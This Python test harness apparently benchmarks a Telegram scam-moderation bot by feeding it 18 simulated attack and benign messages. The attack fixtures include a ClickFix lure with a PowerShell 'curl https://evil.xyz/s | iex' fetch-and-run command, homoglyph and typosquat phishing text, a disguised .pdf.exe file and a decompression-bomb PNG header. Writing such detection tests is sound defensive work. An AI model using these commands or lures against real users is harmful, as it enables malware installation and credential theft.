"""Red-Team Attack Simulation & Precision/Recall/BK-Tree Benchmark Harness for AegisTG v2.0."""

from __future__ import annotations

import asyncio
import io
import struct
import time
import zlib
from dataclasses import dataclass

from PIL import Image, ImageDraw

from protector.analyzers.media_guard import compute_dhash
from protector.auditor import SecurityAuditor
from protector.config import load_config
from protector.engine import ProtectionEngine
from protector.models import (
    ChatConfig,
    ChatType,
    EntityInfo,
    EventType,
    MediaInfo,
    TelegramEvent,
    VerdictAction,
)
from protector.storage import Storage


def _make_flyer_image(color: tuple[int, int, int], variant_border: int = 0) -> bytes:
    """Create a synthetic scam flyer PNG to test 64-bit perceptual dHash matching."""
    img = Image.new("RGB", (160, 120), color=color)
    draw = ImageDraw.Draw(img)
    draw.rectangle([15 + variant_border, 15, 145 - variant_border, 45], fill=(240, 200, 40))
    draw.ellipse([50, 55, 110, 105], fill=(20, 40, 180))
    draw.line([0, 0, 160, 120], fill=(255, 255, 255), width=4)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def _make_decompression_bomb_header_png(width: int = 10000, height: int = 10000) -> bytes:
    """Craft a tiny valid PNG header claiming 100MP dimensions (exceeds 25MP safe cap!)."""
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    ihdr = (
        struct.pack(">I", len(ihdr_data))
        + b"IHDR"
        + ihdr_data
        + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr_data) & 0xFFFFFFFF)
    )
    iend = struct.pack(">I", 0) + b"IEND" + struct.pack(">I", zlib.crc32(b"IEND") & 0xFFFFFFFF)
    return sig + ihdr + iend


@dataclass
class SimResult:
    name: str
    expected_block: bool
    blocked: bool
    risk_score: int
    action: str
    latency_ms: float
    summary: str


async def run_simulation() -> tuple[list[SimResult], int]:
    """Execute 18 realistic Telegram attack, DoS & benign scenarios end-to-end."""
    cfg = load_config()
    storage = Storage(":memory:")
    engine = ProtectionEngine(cfg, storage)

    group_id = -1001000000001
    channel_id = -1002000000002

    storage.upsert_chat_config(
        ChatConfig(
            chat_id=group_id,
            chat_type="supergroup",
            title="Tech Community BD (Linked Discussion)",
            linked_parent_channel_id=channel_id,
            alert_chat_id=-1009999999999,
        )
    )
    storage.upsert_chat_config(
        ChatConfig(
            chat_id=channel_id,
            chat_type="channel",
            title="Tech Community BD Official",
            strict_channel_guard=True,
            alert_chat_id=-1009999999999,
        )
    )

    # Seed known scam flyer hash + 500 decoy hashes to benchmark BK-Tree O(log N) speed!
    orig_flyer = _make_flyer_image((200, 30, 30), variant_border=0)
    flyer_hash = compute_dhash(orig_flyer)
    assert flyer_hash is not None
    engine.media_analyzer.index_banned_hash(
        flyer_hash, "SCAM_PHISHING_SAFEGUARD", "Known crypto drainer flyer"
    )
    for i in range(500):
        # Spread deterministic synthetic hashes far from flyer_hash
        decoy = ((i * 0x9E3779B97F4A7C15) & 0xFFFFFFFFFFFFFFFF) ^ 0xAAAAAAAAAAAAAAAA
        engine.media_analyzer._bk_tree.add(decoy, "SPAM_SHILL_FLOOD", f"decoy-{i}")

    tweaked_flyer = _make_flyer_image((195, 35, 32), variant_border=2)
    base_ts = time.time()
    results: list[SimResult] = []

    async def _run(name: str, ev: TelegramEvent, expected_block: bool) -> None:
        res = await engine.evaluate(ev)
        blocked = res.action != VerdictAction.ALLOW
        results.append(
            SimResult(
                name=name,
                expected_block=expected_block,
                blocked=blocked,
                risk_score=res.risk_score,
                action=res.action.value,
                latency_ms=res.latency_ms,
                summary=res.summary,
            )
        )

    # 1. Fake Safeguard ClickFix PowerShell Malware Scam
    await _run(
        "Fake Safeguard PowerShell Infostealer",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts,
            message_id=101,
            user_id=8100000001,
            text="Manual verification failed! Press Win+R and paste into PowerShell: curl https://evil.xyz/s | iex",
        ),
        expected_block=True,
    )

    # 2. Zero-Tolerance CSAM Raid Planting
    await _run(
        "CSAM Takedown Sabotage Payload",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 1,
            message_id=102,
            user_id=8100000002,
            text="Join fresh cp links mega pack vip folder fast!",
        ),
        expected_block=True,
    )

    # 3. Unicode Homoglyph + Zero-Width Obfuscated Phishing
    await _run(
        "Cyrillic Homoglyph + Zero-Width Phishing",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 2,
            message_id=103,
            user_id=8100000003,
            text="Y\u200bour Tеlegr\u200bаm аccount will be bаnned in 2 hours! Verify your account immediately at https://telegram-verify.com/login",
        ),
        expected_block=True,
    )

    # 4. Hidden text_link Typosquatting Mask
    await _run(
        "Masked Hidden text_link Brand Phish",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 3,
            message_id=104,
            user_id=8100000004,
            text="Click here for official reward!",
            entities=[
                EntityInfo(
                    type="text_link",
                    offset=0,
                    length=10,
                    url="https://tonkeeper-airdrop-claim.xyz/wallet/verify",
                )
            ],
        ),
        expected_block=True,
    )

    # 5. Bengali bKash/Nagad OTP & Double-Money Scam
    await _run(
        "Bengali bKash OTP / Double-Money Scam",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 4,
            message_id=105,
            user_id=8100000005,
            text="ফ্রি টাকা পেতে বিকাশ পিন দিন এবং বিনিয়োগ করে দ্বিগুণ আয় করুন!",
        ),
        expected_block=True,
    )

    # 6. Delayed Edit-Bait Sabotage (Benign post -> waited 3 hours -> edited to inject link!)
    await engine.evaluate(
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts,
            message_id=106,
            user_id=7100000006,
            username="sleeper_acc",
            text="Great post, thanks for sharing this update!",
        )
    )
    await _run(
        "Delayed Edit-Bait Sabotage (3h later)",
        TelegramEvent(
            event_type=EventType.EDITED_MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 10800,
            original_date=base_ts,
            edit_date=base_ts + 10800,
            message_id=106,
            user_id=7100000006,
            username="sleeper_acc",
            text="Claim free crypto airdrop now: https://bit.ly/free-ton-claim",
        ),
        expected_block=True,
    )

    # 7. Spoofed Linked Channel (`sender_chat` Attack)
    await _run(
        "Linked Channel Spoofing (sender_chat)",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 5,
            message_id=107,
            sender_chat_id=-100999888777,
            sender_chat_title="FREE CRYPTO SIGNALS VIP",
            text="Check our bio for 100x gems!",
        ),
        expected_block=True,
    )

    # 8. Disguised Double-Extension Malware File (MZ executable pretending to be PDF)
    await _run(
        "Spoofed PDF.EXE Malware Attachment",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 6,
            message_id=108,
            user_id=8100000008,
            media=MediaInfo(
                media_type="document",
                file_name="salary_bonus_2026.pdf.exe",
                mime_type="application/pdf",
                raw_bytes=b"MZ\x90\x00\x03\x00fake_pe_binary",
            ),
        ),
        expected_block=True,
    )

    # 9. Modified Scam Flyer Matched via BK-Tree O(log N) 64-bit dHash
    await _run(
        "Mutated Scam Flyer (BK-Tree dHash Match)",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 7,
            message_id=109,
            user_id=8100000009,
            media=MediaInfo(media_type="photo", raw_bytes=tweaked_flyer),
        ),
        expected_block=True,
    )

    # 10. Malicious 100MP PNG Decompression Bomb DoS Attempt
    await _run(
        "100MP PNG Decompression-Bomb OOM DoS",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 7.5,
            message_id=110,
            user_id=8100000010,
            media=MediaInfo(media_type="photo", raw_bytes=_make_decompression_bomb_header_png()),
        ),
        expected_block=True,
    )

    # 11. PSL Subdomain Spoof (`telegram.org.evil.co.uk`)
    await _run(
        "PSL Subdomain Spoof (telegram.org.co.uk)",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 8,
            message_id=111,
            user_id=8100000011,
            text="Official verification page: https://telegram.org.evil-auth.co.uk/login",
        ),
        expected_block=True,
    )

    # 12. Leetspeak Brand Typosquat (`te1egram-login.xyz`)
    await _run(
        "Leetspeak Brand Domain (te1egram-login)",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 8.5,
            message_id=112,
            user_id=8100000012,
            text="Check status here: https://te1egram-login.xyz/session",
        ),
        expected_block=True,
    )

    # 13. Hijacked Admin Posting Phishing Scam in Broadcast Channel (Auto-Quarantine!)
    await _run(
        "Hijacked Admin Posting Scam in Channel",
        TelegramEvent(
            event_type=EventType.CHANNEL_POST,
            chat_id=channel_id,
            chat_type=ChatType.CHANNEL,
            timestamp=base_ts + 9,
            message_id=501,
            is_admin=True,
            text="URGENT: Connect your wallet to claim free TON airdrop now at https://t-safeguard.com/claim",
        ),
        expected_block=True,
    )

    # 14. Pre-Publish Channel /draft DMCA Copyright Risk Warning
    await _run(
        "Channel /draft DMCA Piracy Warning",
        TelegramEvent(
            event_type=EventType.DRAFT_CHECK,
            chat_id=channel_id,
            chat_type=ChatType.CHANNEL,
            timestamp=base_ts + 9.5,
            is_admin=True,
            text="Download HD 1080p free movie & cracked software Adobe Premiere link below!",
        ),
        expected_block=True,
    )

    # 15. Federation Ban Propagation Across Sister Chats (Actor 8100000002 from Test #2)
    await _run(
        "Cross-Chat Federation Ban Propagation",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=-1003000000003,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 10,
            message_id=10,
            user_id=8100000002,
            text="Hello everyone!",
        ),
        expected_block=True,
    )

    # 16. BENIGN: Legitimate Technical Security Discussion (Zero False Positive Check!)
    await _run(
        "BENIGN: Tech Discussion About Telegram ToS",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 20,
            message_id=201,
            user_id=5100000011,
            username="architect_dev",
            text="We reviewed https://telegram.org/tos and configured Two-Step Verification and Slow Mode for our engineering community.",
        ),
        expected_block=False,
    )

    # 17. BENIGN: Natural Bengali Community Message (Zero False Positive Check!)
    await _run(
        "BENIGN: Normal Bengali Community Greeting",
        TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=base_ts + 21,
            message_id=202,
            user_id=5100000012,
            username="rahman_bd",
            text="আসসালামু আলাইকুম সবাইকে! আজকের পাইথন এবং সিস্টেম ডিজাইন সেশনটি কখন শুরু হবে?",
        ),
        expected_block=False,
    )

    # 18. BENIGN: Clean Channel Announcement Draft
    await _run(
        "BENIGN: Clean Channel Release Announcement",
        TelegramEvent(
            event_type=EventType.DRAFT_CHECK,
            chat_id=channel_id,
            chat_type=ChatType.CHANNEL,
            timestamp=base_ts + 22,
            is_admin=True,
            text="Release v2.4 is live on https://github.com/example/project — check the changelog and join our Q&A tonight at 9 PM!",
        ),
        expected_block=False,
    )

    auditor = SecurityAuditor(storage)
    audit = auditor.audit_chat_metadata(
        chat_info={
            "id": channel_id,
            "type": "channel",
            "title": "Tech Community BD Official",
            "linked_chat_id": group_id,
            "has_protected_content": True,
        },
        admins=[
            {"status": "creator", "user": {"id": 111, "is_bot": False}},
            {
                "status": "administrator",
                "user": {"id": 999, "is_bot": True},
                "can_delete_messages": True,
                "can_post_messages": True,
                "can_edit_messages": True,
            },
        ],
        bot_user_id=999,
        chat_cfg=storage.get_chat_config(channel_id),
    )

    storage.close()
    return results, audit.score


def main() -> int:
    results, audit_score = asyncio.run(run_simulation())
    passed = 0
    print("=" * 98)
    print(" AegisTG v2.0 Red-Team Security Simulation & Zero-False-Positive Benchmark (501-Hash BK-Tree)")
    print("=" * 98)
    for idx, r in enumerate(results, 1):
        ok = r.blocked == r.expected_block
        if ok:
            passed += 1
        mark = "PASS" if ok else "FAIL"
        exp = "BLOCK" if r.expected_block else "ALLOW"
        print(
            f"{idx:2d}. [{mark}] {r.name:<45} | exp={exp:<5} | score={r.risk_score:3d} "
            f"| {r.action:<23} | {r.latency_ms:5.2f}ms"
        )
    print("-" * 98)
    avg_lat = sum(r.latency_ms for r in results) / len(results)
    print(
        f"Scorecard: {passed}/{len(results)} scenarios passed | "
        f"Avg Latency: {avg_lat:.2f} ms | Sample Channel Audit Score: {audit_score}/100"
    )
    print("=" * 98)
    return 0 if passed == len(results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
